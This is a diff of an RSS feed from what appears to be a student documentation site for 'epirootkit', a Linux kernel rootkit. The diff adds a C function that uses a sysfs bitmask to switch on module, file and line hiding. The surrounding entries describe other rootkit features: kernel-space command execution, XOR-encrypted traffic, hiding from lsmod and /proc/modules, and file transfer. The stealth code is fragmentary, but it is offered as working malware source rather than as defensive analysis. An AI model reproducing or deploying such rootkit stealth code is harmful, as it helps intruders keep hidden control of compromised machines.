@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 04 Jun 2025 22:00:39 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute system commands in kernel space using &lt;code>call_usermodehelper&lt;/code> with output capture.&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 04 Jun 2025 23:33:31 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute system commands in kernel space using &lt;code>call_usermodehelper&lt;/code> with output capture.&lt;/p>
 &lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -111,7 +111,53 @@ static void xor_crypt(const u8 *input, u8 *output, size_t length)
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
+&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux sysfs interface for rootkit control using octal permission-style configuration (like Linux file permissions).&lt;/p>
+&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="5c74fd8" class="language-c ">
+ &lt;code>/* Octal hide control (like file permissions)
+ * 1: Module hidden 2: Files hidden 4: Lines hidden
+ * Examples: 0=visible, 1=module, 3=module&amp;#43;files, 7=all hidden */
+
+static void update_hide_state(int mode)
+{
+ /* Module hiding (bit 0) */
+ if (mode &amp;amp; 1) {
+ if (!is_module_hidden()) hide_module();
+ } else {
+ if (is_module_hidden()) unhide_module();
+ }
+ 
+ /* File hiding (bit 1) */
+ if (mode &amp;amp; 2) {
+ if (!is_file_hiding_enabled()) enable_file_hiding();
+ } else {
+ if (is_file_hiding_enabled()) disable_file_hiding();
+ }
+ 
+ /* Line hiding (bit 2) */
+ if (mode &amp;amp; 4) {
+ if (!is_line_hiding_enabled()) enable_line_hiding();
+ } else {
+ if (is_line_hiding_enabled()) disable_line_hiding();
+ }
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Uses 3-bit octal system (0-7) where each bit controls a stealth feature.&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
 &lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -457,37 +503,4 @@ int handle_download(const char *data)
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Files are encoded in base64 for JSON protocol compatibility.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux sysfs interface with octal permission-style configuration for rootkit control.&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Directory: &lt;code>/sys/kernel/epirootkit/&lt;/code>&lt;/p>
-&lt;p>Uses an octal bitmask system where each bit controls specific stealth features:&lt;/p>
-&lt;ul>
-&lt;li>Bit 0 (1): Module hiding&lt;/li>
-&lt;li>Bit 1 (2): File hiding&lt;/li>
-&lt;li>Bit 2 (4): Line hiding&lt;/li>
-&lt;/ul>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="1a7d116" class="language-c ">
- &lt;code>static void update_hide_state(int mode)
-{
- if (mode &amp;amp; 1) enable_module_hiding();
- if (mode &amp;amp; 2) enable_file_hiding();
- if (mode &amp;amp; 4) enable_line_hiding();
-}&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="sysfs-files">Sysfs Files &lt;a href="#sysfs-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>&lt;code>/sys/kernel/epirootkit/hide&lt;/code>&lt;/strong> - Controls stealth features
-&lt;strong>&lt;code>/sys/kernel/epirootkit/unhide&lt;/code>&lt;/strong> - Quick disable all hiding&lt;/p></description></item></channel></rss>
+&lt;p>Files are encoded in base64 for JSON protocol compatibility.&lt;/p></description></item></channel></rss>
